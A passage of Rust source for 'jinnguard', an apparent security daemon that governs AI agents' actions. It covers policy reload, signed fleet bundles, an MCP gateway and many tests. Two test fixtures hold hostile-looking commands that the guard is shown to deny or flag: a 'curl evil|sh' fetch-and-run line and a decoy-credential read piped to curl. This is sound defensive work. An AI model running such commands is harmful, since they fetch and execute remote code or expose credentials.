            version: LINUX_CAPABILITY_VERSION_3,
            pid: 0, // the calling process
        };
        // v3 uses two 32-bit data slots: caps 0-31 and 32-63.
        let data = [
            CapData {
                effective: (mask & 0xffff_ffff) as u32,
                permitted: (mask & 0xffff_ffff) as u32,
                inheritable: 0,
            },
            CapData {
                effective: (mask >> 32) as u32,
                permitted: (mask >> 32) as u32,
                inheritable: 0,
            },
        ];
        let r =
            unsafe { libc::syscall(libc::SYS_capset, &header as *const CapHeader, data.as_ptr()) };
        if r == 0 {
            Ok(())
        } else {
            Err(std::io::Error::last_os_error().raw_os_error().unwrap_or(-1))
        }
    }
}

/// Process exit codes (sysexits.h convention) for machine-parseable *startup*
/// failures, so a supervisor (systemd, an orchestrator) can branch on the cause
/// instead of a generic exit 1. Once startup succeeds the daemon stays resident;
/// these cover the fatal startup paths only.
pub mod exit_codes {
    pub const EX_UNAVAILABLE: i32 = 69; // a required service (kernel LSM) is unavailable
    pub const EX_SOFTWARE: i32 = 70; // internal/unclassified startup error
    pub const EX_CONFIG: i32 = 78; // missing/invalid configuration (e.g. HMAC secret)

    /// The single machine-parseable fatal line:
    /// `jinnguard: fatal code=<n> kind=<KIND> msg="<message>"`
    pub fn format_fatal(code: i32, kind: &str, msg: &str) -> String {
        format!("jinnguard: fatal code={code} kind={kind} msg={msg:?}")
    }

    /// Emit the fatal line to stderr and exit with `code`.
    pub fn fatal(code: i32, kind: &str, msg: &str) -> ! {
        eprintln!("{}", format_fatal(code, kind, msg));
        std::process::exit(code);
    }
}

#[tokio::main]
async fn main() {
    if let Err(err) = run().await {
        // Any startup error that propagated via `?` lands here with a structured,
        // machine-parseable exit instead of a bare Debug print + exit 1.
        exit_codes::fatal(
            exit_codes::EX_SOFTWARE,
            "STARTUP_FAILED",
            &format!("{err:#}"),
        );
    }
}

async fn run() -> Result<()> {
    let args = CliArgs::parse();
    eprintln!(
        "[startup] pid={} socket_path={} policy_file={} kernel_telemetry_feature={} enterprise_required={} safe_mode={}",
        std::process::id(),
        args.socket_path,
        args.policy_file,
        cfg!(feature = "kernel_telemetry"),
        enterprise_kernel_telemetry_required(),
        jinnguard_safe_mode_enabled()
    );
    if explainability::explainability_demo_enabled() {
        explainability::print_demo_decision("read_file", "allow");
        explainability::print_demo_decision("write_file", "deny");
    }

    // Ensure all required directories exist.
    for dir in [
        Path::new(&args.socket_path).parent(),
        Path::new(&args.lineage_file).parent(),
        Path::new(&args.audit_log).parent(),
    ]
    .into_iter()
    .flatten()
    {
        if !dir.exists() {
            fs::create_dir_all(dir)?;
        }
    }

    // Remove only a stale Unix socket. Refuse regular files/symlinks so a
    // misconfigured --socket-path can never become an arbitrary unlink.
    remove_stale_unix_socket(&args.socket_path)?;

    // Load the admission secret once at startup. Runtime rotation is a supervised
    // restart operation; per-frame file re-reads let a missing secret file crash
    // an already-running daemon mid-connection (JG-RT-006).
    let secret = Arc::new(load_secret_from_file(args.secret_file.as_deref()));

    // Load initial policy.
    let mut initial_policy = load_policy_from_path(&args.policy_file);
    initial_policy.allow_anonymous_override = args.allow_anonymous;
    ensure_control_socket_allowlist(&mut initial_policy, &args.socket_path);
    let active_policy = Arc::new(Mutex::new(initial_policy));

    // Shared state.
    let registry_store = Arc::new(Mutex::new(LineageRegistry::load_or_create(
        &args.lineage_file,
    )));
    let audit_logger = Arc::new(AuditLogger::new(&args.audit_log));
    if let Err(err) = audit_logger.log_boot_marker() {
        eprintln!("[audit] boot marker skipped: {err:#}");
    }
    let telemetry_store: TelemetryStore = Arc::new(Mutex::new(HashMap::new()));
    let nonce_store: Arc<Mutex<ReplayGuard>> =
        Arc::new(Mutex::new(ReplayGuard::with_capacity(MAX_REPLAY_ENTRIES)));

    // Metrics: opt-in Prometheus endpoint on loopback (JINNGUARD_METRICS_PORT).
    metrics::init();
    if let Ok(port_str) = std::env::var("JINNGUARD_METRICS_PORT") {
        match port_str.parse::<u16>() {
            Ok(port) => {
                tokio::spawn(metrics::serve(port));
            }
            Err(_) => eprintln!(
                "[metrics] ignoring invalid JINNGUARD_METRICS_PORT={port_str:?} (want 1-65535)"
            ),
        }
    }
    if let Some(config) = metrics::otlp_config_from_env() {
        tokio::spawn(metrics::serve_otlp(config));
    }

    eprintln!("[startup] initializing LSM verdict loop");
    if let Err(err) = start_lsm_verdict_loop(
        Arc::clone(&active_policy),
        Arc::clone(&telemetry_store),
        &args.socket_path,
    ) {
        // Fail-closed kernel-telemetry startup gets its own code so a supervisor
        // can distinguish "kernel LSM unavailable" from a generic crash.
        exit_codes::fatal(
            exit_codes::EX_UNAVAILABLE,
            "KERNEL_LSM_UNAVAILABLE",
            &format!("{err:#}"),
        );
    }
    eprintln!("[startup] LSM verdict loop initialization complete");

    // ── SIGHUP: hot-reload policy ─────────────────────────────────────────
    {
        let policy_file = args.policy_file.clone();
        let active_policy = Arc::clone(&active_policy);
        let allow_anonymous = args.allow_anonymous;
        let socket_path = args.socket_path.clone();
        tokio::spawn(async move {
            let mut hup = signal(SignalKind::hangup()).expect("failed to install SIGHUP handler");
            loop {
                hup.recv().await;
                println!(
                    "[config] SIGHUP received — reloading policy from {}",
                    policy_file
                );
                match try_load_policy_from_path(&policy_file, allow_anonymous) {
                    Ok(mut new_policy) => {
                        ensure_control_socket_allowlist(&mut new_policy, &socket_path);
                        *active_policy.lock().unwrap() = new_policy;
                        println!("[config] Policy reloaded.");
                    }
                    Err(err) => {
                        eprintln!(
                            "[config] policy reload rejected; keeping active policy: {err:#}"
                        );
                    }
                }
            }
        });
    }

    // ── Optional: remote policy refresh ──────────────────────────────────
    if let Some(policy_url) = args.policy_server.clone() {
        let active_policy = Arc::clone(&active_policy);
        let refresh_secs = args.policy_refresh_secs;
        let allow_anonymous = args.allow_anonymous;
        let socket_path = args.socket_path.clone();
        match reqwest::Client::builder()
            .danger_accept_invalid_certs(false)
            .timeout(POLICY_REFRESH_FETCH_TIMEOUT)
            .build()
        {
            Ok(client) => {
                tokio::spawn(async move {
                    let mut etag: Option<String> = None;
                    loop {
                        tokio::time::sleep(tokio::time::Duration::from_secs(refresh_secs)).await;
                        // Fetch with If-None-Match under a bounded request timeout.
                        let mut req = client.get(&policy_url);
                        if let Some(ref tag) = etag {
                            req = req.header("If-None-Match", tag.as_str());
                        }
                        match req.send().await {
                            Ok(resp) => {
                                if resp.status() == 304 {
                                    // Not modified
                                    continue;
                                }
                                let new_etag = resp
                                    .headers()
                                    .get("ETag")
                                    .and_then(|v| v.to_str().ok())
                                    .map(|s| s.to_string());
                                match read_reqwest_text_limited(resp, POLICY_REFRESH_MAX_BODY_BYTES)
                                    .await
                                {
                                    Ok(body) => {
                                        match parse_policy_content(&body, allow_anonymous) {
                                            Ok(mut cfg) => {
                                                ensure_control_socket_allowlist(
                                                    &mut cfg,
                                                    &socket_path,
                                                );
                                                *active_policy.lock().unwrap() = cfg;
                                                etag = new_etag;
                                                println!(
                                                    "[policy-server] Policy refreshed from {}",
                                                    policy_url
                                                );
                                            }
                                            Err(err) => {
                                                eprintln!(
                                                    "[policy-server] invalid policy body; keeping active policy: {err:#}"
                                                );
                                            }
                                        }
                                    }
                                    Err(e) => {
                                        eprintln!("[policy-server] failed to read body: {e}")
                                    }
                                }
                            }
                            Err(e) => eprintln!("[policy-server] fetch error: {e}"),
                        }
                    }
                });
            }
            Err(e) => {
                eprintln!("[policy-server] failed to build HTTP client: {e}");
            }
        }
    }

    // ── Optional: SIGNED fleet-policy bundle refresh (open-core hook) ─────────
    // The daemon pulls a signed, versioned `PolicyBundle` from an external fleet
    // control plane, verifies its HMAC-SHA256 signature against the fleet key,
    // enforces rollback protection (the version must never regress), and
    // hot-reloads. The control-plane *server* is intentionally NOT part of this
    // open agent — this loop is the stable integration point a (commercial)
    // fleet manager plugs into by speaking the bundle protocol. Every failure
    // path keeps the current policy (fail-safe): a bad signature, a regressed
    // version, an unreachable server, or unparseable content never weakens or
    // clears the running policy.
    #[cfg(feature = "fleet")]
    if let Some(fleet_url) = args.fleet_policy_url.clone() {
        let active_policy = Arc::clone(&active_policy);
        let refresh_secs = args.policy_refresh_secs;
        let allow_anonymous = args.allow_anonymous;
        // Verify with a dedicated fleet key if provided, else the admission secret.
        let fleet_key: Vec<u8> = match args.fleet_secret_file.as_deref() {
            Some(path) => load_secret_from_file(Some(path)),
            None => (*secret).clone(),
        };
        let cache_path = args.fleet_policy_cache.clone();
        let socket_path = args.socket_path.clone();
        tokio::spawn(async move {
            // Rollback floor: never accept a bundle older than this. Seeded from
            // the active policy and ratcheted up as newer bundles are applied.
            let mut min_version: u64 = active_policy.lock().unwrap().fleet_policy_min_version;
            let mut applied_version: u64 = 0;

            // Offline resilience: seed from the on-disk cache on startup.
            if let Some(ref cp) = cache_path {
                if let Some(bundle) = fleet_policy::load_cached_bundle(cp) {
                    if bundle.version >= min_version && bundle.verify(&fleet_key) {
                        if let Some(mut cfg) =
                            parse_policy_yaml(&bundle.policy_yaml, allow_anonymous)
                        {
                            ensure_control_socket_allowlist(&mut cfg, &socket_path);
                            *active_policy.lock().unwrap() = cfg;
                            applied_version = bundle.version;
                            min_version = min_version.max(bundle.version);
                            println!(
                                "[fleet] seeded policy from cache (version={})",
                                bundle.version
                            );
                        }
                    }
                }
            }

            let client = match reqwest::Client::builder()
                .timeout(POLICY_REFRESH_FETCH_TIMEOUT)
                .build()
            {
                Ok(c) => c,
                Err(e) => {
                    eprintln!("[fleet] HTTP client build failed: {e}");
                    return;
                }
            };
            loop {
                tokio::time::sleep(tokio::time::Duration::from_secs(refresh_secs)).await;

                let resp = match client
                    .get(&fleet_url)
                    .header("accept", "application/json")
                    .send()
                    .await
                {
                    Ok(r) => r,
                    Err(e) => {
                        eprintln!("[fleet] fetch error: {e}");
                        continue;
                    }
                };
                if !resp.status().is_success() {
                    eprintln!("[fleet] server returned {}", resp.status());
                    continue;
                }
                let body =
                    match read_reqwest_text_limited(resp, POLICY_REFRESH_MAX_BODY_BYTES).await {
                        Ok(b) => b,
                        Err(e) => {
                            eprintln!("[fleet] read error: {e}");
                            continue;
                        }
                    };
                let bundle: fleet_policy::PolicyBundle = match serde_json::from_str(&body) {
                    Ok(b) => b,
                    Err(e) => {
                        eprintln!("[fleet] bundle parse failed: {e}");
                        continue;
                    }
                };
                // Single source of truth for accept/reject (unit-tested in
                // fleet_policy::tests). Rollback protection + signature
                // verification both fail closed: the current policy is kept.
                use fleet_policy::BundleDecision;
                match fleet_policy::evaluate_bundle(
                    &bundle,
                    min_version,
                    applied_version,
                    &fleet_key,
                ) {
                    BundleDecision::RejectRollback => {
                        eprintln!(
                            "[fleet] REJECT bundle version {} < rollback floor {}",
                            bundle.version, min_version
                        );
                        continue;
                    }
                    BundleDecision::RejectBadSignature => {
                        eprintln!(
                            "[fleet] REJECT bundle version {}: signature INVALID",
                            bundle.version
                        );
                        continue;
                    }
                    BundleDecision::AlreadyApplied => continue,
                    BundleDecision::Apply => {}
                }
                match parse_policy_yaml(&bundle.policy_yaml, allow_anonymous) {
                    Some(mut cfg) => {
                        ensure_control_socket_allowlist(&mut cfg, &socket_path);
                        *active_policy.lock().unwrap() = cfg;
                        applied_version = bundle.version;
                        min_version = min_version.max(bundle.version);
                        if let Some(ref cp) = cache_path {
                            if let Err(e) = fleet_policy::cache_bundle(&bundle, cp) {
                                eprintln!("[fleet] cache write failed: {e}");
                            }
                        }
                        println!(
                            "[fleet] applied signed policy bundle version={} (rollback floor={})",
                            bundle.version, min_version
                        );
                    }
                    None => eprintln!(
                        "[fleet] bundle version {} has unparseable policy_yaml; keeping current policy",
                        bundle.version
                    ),
                }
            }
        });
    }

    // ── MCP gateway ───────────────────────────────────────────────────────
    {
        let mcp_port = args.mcp_port;
        let mcp_upstream = args.mcp_upstream.clone();
        let active_policy = Arc::clone(&active_policy);
        let registry_clone = Arc::clone(&registry_store);
        let audit_clone = Arc::clone(&audit_logger);
        let telemetry_clone = Arc::clone(&telemetry_store);
        let secret_clone = Arc::clone(&secret);

        // #11 optional mTLS: all three of --mcp-tls-{cert,key,ca} must be set
        // together. A partial combination is a configuration error (fail-closed:
        // we refuse to start rather than silently fall back to plaintext).
        let mcp_tls = match (
            args.mcp_tls_cert.clone(),
            args.mcp_tls_key.clone(),
            args.mcp_tls_ca.clone(),
        ) {
            (None, None, None) => None,
            (Some(cert), Some(key), Some(ca)) => {
                let cfg = mcp_gateway::McpTlsConfig { cert, key, ca };
                match mcp_gateway::build_mcp_tls_acceptor(&cfg) {
                    Ok(acceptor) => {
                        eprintln!(
                            "[startup] MCP gateway mTLS enabled (client certificates required)"
                        );
                        Some(Arc::new(acceptor))
                    }
                    Err(e) => exit_codes::fatal(
                        exit_codes::EX_CONFIG,
                        "MCP_TLS_CONFIG",
                        &format!("{e:#}"),
                    ),
                }
            }
            _ => exit_codes::fatal(
                exit_codes::EX_CONFIG,
                "MCP_TLS_CONFIG",
                "MCP mTLS requires --mcp-tls-cert, --mcp-tls-key and --mcp-tls-ca together",
            ),
        };

        tokio::spawn(async move {
            mcp_gateway::run_mcp_gateway(
                mcp_port,
                mcp_upstream,
                active_policy,
                registry_clone,
                audit_clone,
                telemetry_clone,
                secret_clone,
                mcp_tls,
            )
            .await;
        });
    }

    // ── UDS listener (primary enforcement path) ───────────────────────────
    eprintln!("[startup] binding Unix socket {}", &args.socket_path);
    let listener = UnixListener::bind(&args.socket_path)?;
    if let Some(raw_mode) = args.socket_mode.as_deref() {
        let socket_mode = parse_socket_mode(raw_mode)?;
        fs::set_permissions(&args.socket_path, fs::Permissions::from_mode(socket_mode))?;
        eprintln!(
            "[startup] Unix socket bound {} mode={:04o}",
            &args.socket_path, socket_mode
        );
    } else {
        eprintln!("[startup] Unix socket bound {}", &args.socket_path);
    }
    println!("🚀 JINN GUARD ACTIVE: {}", &args.socket_path);
    println!("----------------------------------------------------------------------");

    loop {
        match listener.accept().await {
            Ok((stream, _addr)) => {
                let policy_snapshot = active_policy.lock().unwrap().clone();
                let registry_clone = Arc::clone(&registry_store);
                let logger_clone = Arc::clone(&audit_logger);
                let telemetry_clone = Arc::clone(&telemetry_store);
                let secret_clone = Arc::clone(&secret);
                let nonce_clone = Arc::clone(&nonce_store);
                tokio::spawn(async move {
                    handle_client_connection(
                        stream,
                        policy_snapshot,
                        registry_clone,
                        logger_clone,
                        telemetry_clone,
                        secret_clone,
                        nonce_clone,
                    )
                    .await;
                });
            }
            Err(err) => println!("Worker interface connection drop error: {}", err),
        }
    }
}

/// Adaptive enforcement with deterministic floors (M6). Proves the adaptation
/// can only tighten: the penalty is non-negative, monotonic non-decreasing,
/// bounded by a hard cap, and zero-offense application is a no-op.
#[cfg(test)]
mod adaptive_floor_tests {
    use super::{
        adaptive_risk_penalty, apply_adaptive_penalty, current_agent_offenses,
        record_agent_offense, ADAPTIVE_PENALTY_CAP,
    };
    use crate::governance::RiskAssessment;

    fn assessment(risk: f64) -> RiskAssessment {
        RiskAssessment {
            observed_risk: risk,
            semantic_risk: risk,
            topology_risk: risk,
            declared_risk: None,
            fused_risk: risk,
            trust_score: 100.0 - risk,
            reasons: vec![],
        }
    }

    #[test]
    fn penalty_is_zero_at_zero_offenses() {
        assert_eq!(adaptive_risk_penalty(0), 0.0);
    }

    #[test]
    fn penalty_is_monotonic_nondecreasing_and_bounded() {
        let mut prev = 0.0;
        for n in 0..100u32 {
            let p = adaptive_risk_penalty(n);
            assert!(p >= prev, "penalty must never decrease as offenses rise");
            assert!(p >= 0.0, "penalty must never be negative");
            assert!(
                p <= ADAPTIVE_PENALTY_CAP,
                "penalty must be bounded by the hard cap"
            );
            prev = p;
        }
        // Saturates at the cap — adaptation cannot escalate without bound.
        assert_eq!(adaptive_risk_penalty(1_000_000), ADAPTIVE_PENALTY_CAP);
    }

    #[test]
    fn apply_is_tighten_only() {
        let mut a = assessment(20.0);
        let (risk_before, trust_before) = (a.fused_risk, a.trust_score);
        apply_adaptive_penalty(&mut a, 3);
        assert!(
            a.fused_risk >= risk_before,
            "adaptation may only raise risk"
        );
        assert!(
            a.trust_score <= trust_before,
            "adaptation may only lower trust"
        );
    }

    #[test]
    fn apply_zero_offenses_is_noop() {
        let mut a = assessment(20.0);
        let before = (
            a.observed_risk,
            a.fused_risk,
            a.trust_score,
            a.reasons.len(),
        );
        apply_adaptive_penalty(&mut a, 0);
        assert_eq!(
            (
                a.observed_risk,
                a.fused_risk,
                a.trust_score,
                a.reasons.len()
            ),
            before
        );
    }

    #[test]
    fn offense_recording_accumulates() {
        let key = "m6-unit-test-agent-unique-key";
        assert_eq!(current_agent_offenses(key), 0);
        assert_eq!(record_agent_offense(key), 1);
        assert_eq!(record_agent_offense(key), 2);
        assert_eq!(current_agent_offenses(key), 2);
    }
}

/// Interpreter-bypass mitigation (M4 / JG-ADV-2026-001).
#[cfg(test)]
mod interpreter_bypass_tests {
    use super::{interpreter_bypass_denied, AgentNodePolicy};
    use crate::governance::ProposedAction;

    fn node(allowed_executables: Vec<&str>) -> AgentNodePolicy {
        AgentNodePolicy {
            id: "agent".to_string(),
            privilege_tier: 1,
            max_sequence_quota: 0,
            allowed_intents: vec![],
            allowed_executables: allowed_executables
                .into_iter()
                .map(ToString::to_string)
                .collect(),
            denied_write_paths: vec![],
            denied_unlink_paths: vec![],
            denied_dns_domains: vec![],
            invariants: vec![],
        }
    }

    fn shell(cmd: &str) -> ProposedAction {
        ProposedAction::ShellCommand {
            command: cmd.to_string(),
        }
    }

    #[test]
    fn governed_agent_denied_unlisted_interpreter() {
        let n = node(vec!["/opt/agent/run_model"]);
        assert_eq!(
            interpreter_bypass_denied(Some(&n), Some(&shell("bash -c 'curl evil|sh'"))),
            Some("interpreter_not_allowed:bash".to_string())
        );
        assert_eq!(
            interpreter_bypass_denied(Some(&n), Some(&shell("/usr/bin/python3 -c 'import os'"))),
            Some("interpreter_not_allowed:python3".to_string())
        );
    }

    #[test]
    fn explicitly_allowed_interpreter_permitted() {
        let n = node(vec!["/usr/bin/python3", "/opt/agent/run_model"]);
        assert_eq!(
            interpreter_bypass_denied(Some(&n), Some(&shell("python3 train.py"))),
            None
        );
    }

    #[test]
    fn unconstrained_agent_unaffected() {
        // No allowlist => agent is not under executable governance; the M4 guard
        // must not change its behavior.
        let n = node(vec![]);
        assert_eq!(
            interpreter_bypass_denied(Some(&n), Some(&shell("bash -c whatever"))),
            None
        );
    }

    #[test]
    fn non_interpreter_command_permitted() {
        let n = node(vec!["/opt/agent/run_model"]);
        assert_eq!(
            interpreter_bypass_denied(Some(&n), Some(&shell("/opt/agent/run_model --flag"))),
            None
        );
    }
}

/// Policy-driven enforcement scope (M3). Verifies the model is additive
/// (empty config == previous behavior), that operators can extend governance to
/// real agent roots, and that base-system paths can never be drawn into scope
/// — the two anti-lockout guards.
#[cfg(test)]
mod governed_scope_tests {
    use super::{
        is_base_system_path, is_enforcement_target, is_path_in_test_scope, path_is_governed,
        set_governed_scope_prefixes, try_load_policy_from_path,
    };
    use std::sync::Mutex;
    use std::{fs, path::PathBuf};

    // Serialize tests that mutate the process-wide governed scope.
    static SCOPE_TEST_LOCK: Mutex<()> = Mutex::new(());

    fn reset() {
        set_governed_scope_prefixes(&[]);
    }

    fn temp_policy_path(name: &str) -> PathBuf {
        let mut path = std::env::temp_dir();
        path.push(format!(
            "jinnguard_policy_reload_{}_{}.yaml",
            name,
            std::process::id()
        ));
        path
    }

    #[test]
    fn empty_scope_preserves_built_in_behavior() {
        let _g = SCOPE_TEST_LOCK.lock().unwrap();
        reset();
        for p in [
            "/tmp/jinnguard-test/x",
            "/opt/jinn-agent/run",
            "/home/alice/work/script",
            "/usr/bin/bash",
            "/etc/passwd",
        ] {
            assert_eq!(path_is_governed(p), is_path_in_test_scope(p), "path {p}");
        }
        reset();
    }

    #[test]
    fn configured_prefix_becomes_governed() {
        let _g = SCOPE_TEST_LOCK.lock().unwrap();
        reset();
        let installed = set_governed_scope_prefixes(&[
            "/opt/jinn-agent".to_string(),
            "/srv/agents/work/".to_string(),
        ]);
        assert_eq!(installed.len(), 2, "both legitimate prefixes install");
        assert!(path_is_governed("/opt/jinn-agent/runner"));
        assert!(path_is_governed("/srv/agents/work/output.txt"));
        assert!(is_enforcement_target("/opt/jinn-agent/runner"));
        // A sibling outside the configured prefix stays ungoverned.
        assert!(!path_is_governed("/opt/other/runner"));
        reset();
    }

    #[test]
    fn base_system_prefixes_rejected_at_install() {
        let _g = SCOPE_TEST_LOCK.lock().unwrap();
        reset();
        let installed = set_governed_scope_prefixes(&[
            "/".to_string(),
            "/usr".to_string(),
            "/usr/bin".to_string(),
            "/etc/agents".to_string(),
            "/bin".to_string(),
            "relative/path".to_string(),
            String::new(),
        ]);
        assert!(
            installed.is_empty(),
            "ANTI-LOCKOUT: no base-system or malformed prefix may install, got {installed:?}"
        );
        reset();
    }

    #[test]
    fn base_system_paths_never_governed_even_with_config() {
        let _g = SCOPE_TEST_LOCK.lock().unwrap();
        reset();
        // A legitimate governed root is active; operator-critical base-system
        // paths must still never be governed (second anti-lockout guard).
        set_governed_scope_prefixes(&["/opt/jinn-agent".to_string()]);
        for p in [
            "/usr/lib/xorg/Xorg",
            "/bin/bash",
            "/lib/systemd/systemd",
            "/sbin/init",
            "/etc/passwd",
            "/run/dbus/system_bus_socket",
        ] {
            assert!(is_base_system_path(p), "{p} should be a base-system path");
            assert!(
                !path_is_governed(p),
                "ANTI-LOCKOUT: base-system path {p} must never be governed"
            );
        }
        reset();
    }

    #[test]
    fn failed_policy_try_load_keeps_existing_governed_scope() {
        let _g = SCOPE_TEST_LOCK.lock().unwrap();
        reset();
        set_governed_scope_prefixes(&["/opt/jinn-agent".to_string()]);
        let path = temp_policy_path("invalid");
        fs::write(&path, "global_safety_ceiling: [not-valid").unwrap();

        let err = try_load_policy_from_path(path.to_str().unwrap(), false).unwrap_err();

        assert!(err.to_string().contains("invalid policy YAML"));
        assert!(
            path_is_governed("/opt/jinn-agent/runner"),
            "failed reload must leave last good governed scope intact"
        );
        let _ = fs::remove_file(path);
        reset();
    }

    #[test]
    fn successful_policy_try_load_installs_scope_and_anonymous_deny() {
        let _g = SCOPE_TEST_LOCK.lock().unwrap();
        reset();
        let path = temp_policy_path("valid");
        fs::write(
            &path,
            r#"
global_safety_ceiling: 80
deny_anonymous_agents: true
enforcement_scope:
  governed_path_prefixes:
    - /opt/jinn-agent
"#,
        )
        .unwrap();

        let policy = try_load_policy_from_path(path.to_str().unwrap(), false).unwrap();

        assert!(policy.deny_anonymous_agents);
        assert!(path_is_governed("/opt/jinn-agent/runner"));
        let _ = fs::remove_file(path);
        reset();
    }
}

/// Canary tripwire detection (WS3 / DENY_CANARY_TRIPWIRE).
#[cfg(test)]
mod canary_tests {
    use super::proposal_trips_canary;
    use crate::governance::{ClientProposal, ProposedAction};
    use std::collections::HashMap;

    fn proposal(intent: Option<&str>, action: Option<ProposedAction>) -> ClientProposal {
        ClientProposal {
            sequence_counter: 1,
            intent_name: intent.map(ToString::to_string),
            action_risk_score: Some(1.0),
            session_privilege_bit: None,
            prompt: None,
            plan: None,
            source_code: None,
            requested_capabilities: vec![],
            proposed_action: action,
            context_vars: HashMap::new(),
        }
    }

    fn canaries(items: &[&str]) -> Vec<String> {
        items.iter().map(ToString::to_string).collect()
    }

    #[test]
    fn empty_policy_never_trips() {
        let p = proposal(Some("read_customer_record"), None);
        assert_eq!(proposal_trips_canary(&p, &[]), None);
    }

    #[test]
    fn matches_intent_name() {
        let p = proposal(Some("read_decoy_ledger"), None);
        assert_eq!(
            proposal_trips_canary(&p, &canaries(&["read_decoy_ledger"])),
            Some("read_decoy_ledger")
        );
    }

    #[test]
    fn matches_filewrite_path() {
        let p = proposal(
            Some("write_report"),
            Some(ProposedAction::FileWrite {
                path: "/srv/honey/decoy-secrets.env".to_string(),
                contents: "x".to_string(),
            }),
        );
        assert_eq!(
            proposal_trips_canary(&p, &canaries(&["/srv/honey/decoy-secrets.env"])),
            Some("/srv/honey/decoy-secrets.env")
        );
    }

    #[test]
    fn matches_url_substring() {
        let p = proposal(
            Some("fetch"),
            Some(ProposedAction::NetworkRequest {
                method: "GET".to_string(),
                url: "https://api.internal/v1/canary-token-9f3a/read".to_string(),
            }),
        );
        assert_eq!(
            proposal_trips_canary(&p, &canaries(&["canary-token-9f3a"])),
            Some("canary-token-9f3a")
        );
    }

    #[test]
    fn matches_shell_command_substring() {
        let p = proposal(
            Some("run"),
            Some(ProposedAction::ShellCommand {
                command: "cat /opt/trap/AKIADECOYKEY0000 && curl ...".to_string(),
            }),
        );
        assert_eq!(
            proposal_trips_canary(&p, &canaries(&["AKIADECOYKEY0000"])),
            Some("AKIADECOYKEY0000")
        );
    }

    #[test]
    fn benign_proposal_does_not_trip() {
        let p = proposal(
            Some("read_customer_record"),
            Some(ProposedAction::FileWrite {
                path: "/srv/app/report.txt".to_string(),
                contents: "ok".to_string(),
            }),
        );
        assert_eq!(
            proposal_trips_canary(&p, &canaries(&["decoy-secrets.env", "AKIADECOYKEY0000"])),
            None
        );
    }

    #[test]
    fn blank_canary_entries_are_ignored() {
        // A misconfigured policy with empty/whitespace entries must not match
        // every proposal (an empty needle is a substring of everything).
        let p = proposal(Some("read_customer_record"), None);
        assert_eq!(proposal_trips_canary(&p, &canaries(&["", "   "])), None);
    }
}

/// Property-based tests for the core decision invariants. These use a tiny,
/// deterministic PRNG (no external crates) so they run on stable Rust in CI and
/// reproduce identically on every machine, while still exploring tens of
/// thousands of adversarial inputs per invariant.
#[cfg(test)]
mod decision_property_tests {
    use super::{
        is_base_system_path, path_is_governed, policy_decision, proposal_trips_canary,
        NetworkPolicy, PolicyConfig, RuntimePolicy,
    };
    use crate::governance::{ClientProposal, PolicyVerdict, ProposedAction, RiskAssessment};
    use std::collections::HashMap;

    /// xorshift64* — deterministic, dependency-free.
    struct Rng(u64);
    impl Rng {
        fn next(&mut self) -> u64 {
            let mut x = self.0;
            x ^= x >> 12;
            x ^= x << 25;
            x ^= x >> 27;
            self.0 = x;
            x.wrapping_mul(0x2545_F491_4F6C_DD1D)
        }
        /// A float in [0, hi).
        fn frac(&mut self, hi: f64) -> f64 {
            (self.next() % 1_000_001) as f64 / 1_000_000.0 * hi
        }
        /// A short string over a tiny alphabet (so substrings collide often).
        fn token(&mut self, max_len: usize) -> String {
            const ALPHABET: &[u8] = b"ab_/.0";
            let len = (self.next() as usize) % (max_len + 1);
            (0..len)
                .map(|_| ALPHABET[(self.next() as usize) % ALPHABET.len()] as char)
                .collect()
        }
    }

    fn policy(ceiling: f64) -> PolicyConfig {
        PolicyConfig {
            upper_safety_boundary: ceiling,
            minimum_trust_score: 100.0 - ceiling,
            agent_nodes: HashMap::new(),
            deny_anonymous_agents: false,
            allow_anonymous_override: false,
            network_policy: NetworkPolicy::default(),
            runtime_policy: RuntimePolicy::default(),
            fleet_policy_min_version: 0,
            accept_cross_machine_lineage: false,
            canary_resources: Vec::new(),
        }
    }

    fn assess(fused: f64, trust: f64) -> RiskAssessment {
        RiskAssessment {
            observed_risk: fused,
            semantic_risk: fused,
            topology_risk: 0.0,
            declared_risk: None,
            fused_risk: fused,
            trust_score: trust,
            reasons: vec![],
        }
    }

    /// INVARIANT: an action whose fused risk exceeds the ceiling, whose trust is
    /// below the floor, or whose risk/trust is non-finite is NEVER allowed.
    /// This is the fail-closed core of the policy decision.
    #[test]
    fn prop_policy_decision_is_fail_closed() {
        let mut rng = Rng(0xDEAD_BEEF_CAFE_F00D);
        for _ in 0..100_000 {
            let ceiling = 1.0 + rng.frac(98.0); // (1, 99)
                                                // Mostly finite risks, occasionally NaN / +inf to probe the guard.
            let fused = match rng.next() % 16 {
                0 => f64::NAN,
                1 => f64::INFINITY,
                _ => rng.frac(200.0),
            };
            let trust = match rng.next() % 16 {
                0 => f64::NAN,
                _ => rng.frac(100.0),
            };
            let d = policy_decision(&assess(fused, trust), &policy(ceiling));

            if !fused.is_finite() || !trust.is_finite() {
                assert_eq!(d.verdict, PolicyVerdict::Deny, "non-finite must deny");
                continue;
            }
            if fused > ceiling {
                assert_eq!(
                    d.verdict,
                    PolicyVerdict::Deny,
                    "risk {fused} over ceiling {ceiling} must deny"
                );
            }
            if trust < 100.0 - ceiling {
                assert!(!d.is_allow(), "trust below floor must not allow");
            }
            // The cardinal fail-open check: never ALLOW above the ceiling.
            if d.is_allow() {
                assert!(fused <= ceiling, "ALLOW implies risk within ceiling");
                assert!(trust >= 100.0 - ceiling, "ALLOW implies trust above floor");
            }
        }
    }

    /// INVARIANT: the canary tripwire fires for a proposal iff some configured,
    /// non-blank decoy is a substring of the proposal's resource surface.
    /// Checked against an independent reference computed here.
    #[test]
    fn prop_canary_trips_iff_decoy_present() {
        let mut rng = Rng(0x0123_4567_89AB_CDEF);
        for _ in 0..100_000 {
            let intent = rng.token(6);
            let path = rng.token(6);
            let proposal = ClientProposal {
                sequence_counter: 1,
                intent_name: Some(intent.clone()),
                action_risk_score: Some(1.0),
                session_privilege_bit: None,
                prompt: None,
                plan: None,
                source_code: None,
                requested_capabilities: vec![],
                proposed_action: Some(ProposedAction::FileWrite {
                    path: path.clone(),
                    contents: String::new(),
                }),
                context_vars: HashMap::new(),
            };
            let n = (rng.next() as usize) % 3;
            let canaries: Vec<String> = (0..n).map(|_| rng.token(3)).collect();

            // Reference: trips iff a non-blank canary is a substring of intent or path.
            let expected = canaries.iter().any(|c| {
                let c = c.trim();
                !c.is_empty() && (intent.contains(c) || path.contains(c))
            });
            let got = proposal_trips_canary(&proposal, &canaries).is_some();
            assert_eq!(
                got, expected,
                "intent={intent:?} path={path:?} canaries={canaries:?}"
            );
        }
    }

    /// ANTI-LOCKOUT INVARIANT: no path under a base-system directory is ever
    /// governed, regardless of the random suffix appended.
    #[test]
